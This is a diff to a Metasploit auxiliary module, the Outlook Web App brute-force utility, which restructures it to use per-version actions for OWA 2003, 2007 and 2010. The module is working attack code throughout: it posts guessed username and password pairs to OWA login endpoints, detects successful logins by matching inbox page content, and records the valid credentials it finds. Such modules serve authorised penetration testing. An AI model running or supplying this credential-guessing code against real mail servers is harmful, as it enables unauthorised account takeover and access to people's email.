@@ -1,8 +1,8 @@
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -17,21 +17,53 @@ class Metasploit3 < Msf::Auxiliary
 		super(
 			'Name'           => 'Outlook Web App (OWA) Brute Force Utility',
 			'Description'    => %q{
-				This module tests credentials on OWA 2003, 2007 and 2010 servers.
+				This module tests credentials on OWA 2003, 2007 and 2010 servers. The default
+				action is set to OWA 2010.
 			},
 			'Author'         =>
 				[
 					'Vitor Moreira',
 					'Spencer McIntyre',
-					'SecureState R&D Team'
+					'SecureState R&D Team',
+					'sinn3r'
 				],
-			'License'        => MSF_LICENSE
+			'License'        => MSF_LICENSE,
+			'Actions'        =>
+				[
+					[
+						'OWA 2003',
+						{
+							'Description' => 'OWA version 2003',
+							'AuthPath'    => '/exchweb/bin/auth/owaauth.dll',
+							'InboxPath'   => '/exchange/',
+							'InboxCheck'  => /Inbox/
+						}
+					],
+					[
+						'OWA 2007',
+						{
+							'Description' => 'OWA version 2007',
+							'AuthPath'    => '/owa/auth/owaauth.dll',
+							'InboxPath'   => '/owa/',
+							'InboxCheck'  => /addrbook.gif/
+						}
+					],
+					[
+						'OWA 2010',
+						{
+							'Description' => 'OWA version 2010',
+							'AuthPath'    => '/owa/auth.owa',
+							'InboxPath'   => '/owa/',
+							'InboxCheck'  => /Inbox|location(\x20*)=(\x20*)"\\\/(\w+)\\\/logoff\.owa|A mailbox couldn\'t be found/
+						}
+					]
+				],
+			'DefaultAction' => 'OWA 2010'
 		)
 
 		register_options(
 			[
 				OptInt.new('RPORT', [ true, "The target port", 443]),
-				OptString.new('VERSION', [ true, "OWA VERSION (2003, 2007, or 2010)", '2007'])
 			], self.class)
 
 		register_advanced_options(
@@ -43,40 +75,55 @@ class Metasploit3 < Msf::Auxiliary
 		deregister_options('BLANK_PASSWORDS')
 	end
 
-	def run
-		datastore['BLANK_PASSWORDS'] = false  # OWA doesn't support blank passwords
-		vhost = datastore['VHOST'] || datastore['RHOST']
+	def cleanup
+		# Restore the original settings
+		datastore['BLANK_PASSWORDS'] = @blank_passwords_setting
+		datastore['USER_AS_PASS']    = @user_as_pass_setting
+	end
 
-		if datastore['VERSION'] == '2003'
-			authPath = '/exchweb/bin/auth/owaauth.dll'
-			inboxPath = '/exchange/'
-			loginCheck = /Inbox/
-		elsif datastore['VERSION'] == '2007'
-			authPath = '/owa/auth/owaauth.dll'
-			inboxPath = '/owa/'
-			loginCheck = /addrbook.gif/
-		elsif datastore['VERSION'] == '2010'
-			authPath = '/owa/auth.owa'  # Post creds here
-			inboxPath = '/owa/'         # Get request with cookie/sessionid
-			loginCheck = /Inbox/        # check result
-		else
-			print_error('Invalid Version, Select 2003, 2007, or 2010')
-			return
+	def run
+		# Store the original setting
+		@blank_passwords_setting = datastore['BLANK_PASSWORDS']
+
+		# OWA doesn't support blank passwords
+		datastore['BLANK_PASSWORDS'] = false
+
+		# If there's a pre-defined username/password, we need to turn off USER_AS_PASS
+		# so that the module won't just try username:username, and then exit.
+		@user_as_pass_setting = datastore['USER_AS_PASS']
+		if not datastore['USERNAME'].nil? and not datastore['PASSWORD'].nil?
+			print_status("Disabling 'USER_AS_PASS' because you've specified an username/password")
+			datastore['USER_AS_PASS'] = false
 		end
 
-		print_status("Testing OWA: version #{datastore['VERSION']} against #{vhost}:#{datastore['RPORT'].to_s}")
+		vhost = datastore['VHOST'] || datastore['RHOST']
+
+		print_status("#{msg} Testing version #{action.name}")
+
+		# Here's a weird hack to check if each_user_pass is empty or not
+		# apparently you cannot do each_user_pass.empty? or even inspect() it
+		isempty = true
+		each_user_pass do |user|
+			isempty = false
+			break
+		end
+		print_error("No username/password specified") if isempty
+
+		auth_path   = action.opts['AuthPath']
+		inbox_path  = action.opts['InboxPath']
+		login_check = action.opts['InboxCheck']
 
 		begin
 			each_user_pass do |user, pass|
-				vprint_status("Trying #{user} : #{pass}")
-				try_user_pass(user, pass, authPath, inboxPath, loginCheck, vhost)
+				vprint_status("#{msg} Trying #{user} : #{pass}")
+				try_user_pass(user, pass, auth_path, inbox_path, login_check, vhost)
 			end
 		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED
-			print_error('HTTP Connection Error, Aborting')
+			print_error("#{msg} HTTP Connection Error, Aborting")
 		end
 	end
 
-	def try_user_pass(user, pass, authPath, inboxPath, loginCheck, vhost)
+	def try_user_pass(user, pass, auth_path, inbox_path, login_check, vhost)
 		user = datastore['AD_DOMAIN'] + '\\' + user if datastore['AD_DOMAIN'] != ''
 		headers = {
 			'Cookie' => 'PBack=0'
@@ -91,24 +138,24 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			res = send_request_cgi({
 				'encode'   => true,
-				'uri'      => authPath,
+				'uri'      => auth_path,
 				'method'   => 'POST',
 				'headers'  => headers,
 				'data'     => data
-			}, 20)
+			}, 25)
 
 		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
-			print_error('HTTP Connection Failed, Aborting')
+			print_error("#{msg} HTTP Connection Failed, Aborting")
 			return :abort
 		end
 
 		if not res
-			print_error('HTTP Connection Error, Aborting')
+			print_error("#{msg} HTTP Connection Error, Aborting")
 			return :abort
 		end
 
 		if not res.headers['set-cookie']
-			print_error('Received Invalid Repsonse due to a missing cookie (Possibly Due To Invalid Version), Aborting')
+			print_error("#{msg} Received invalid repsonse due to a missing cookie (possibly due to invalid version), aborting")
 			return :abort
 		end
 
@@ -120,27 +167,27 @@ class Metasploit3 < Msf::Auxiliary
 
 		begin
 			res = send_request_cgi({
-				'uri'       => inboxPath,
+				'uri'       => inbox_path,
 				'method'    => 'GET',
 				'headers'   => headers
 			}, 20)
 		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
-			print_error('HTTP Connection Failed, Aborting')
+			print_error("#{msg} HTTP Connection Failed, Aborting")
 			return :abort
 		end
 
 		if not res
-			print_error('HTTP Connection Error, Aborting')
+			print_error("#{msg} HTTP Connection Error, Aborting")
 			return :abort
 		end
 
 		if res.code == 302
-			vprint_error("FAILED LOGIN. #{user} : #{pass}")
+			vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}'")
 			return :skip_pass
 		end
 
-		if res.body =~ loginCheck
-			print_good("SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")
+		if res.body =~ login_check
+			print_good("#{msg} SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")
 
 			report_hash = {
 				:host   => datastore['RHOST'],
@@ -154,9 +201,13 @@ class Metasploit3 < Msf::Auxiliary
 			report_auth_info(report_hash)
 			return :next_user
 		else
-			vprint_error("FAILED LOGIN. #{user} : #{pass}")
+			vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}'")
 			return :skip_pass
 		end
+	end
+
+	def msg
+		"#{vhost}:#{rport} OWA -"
 	end
 
 end
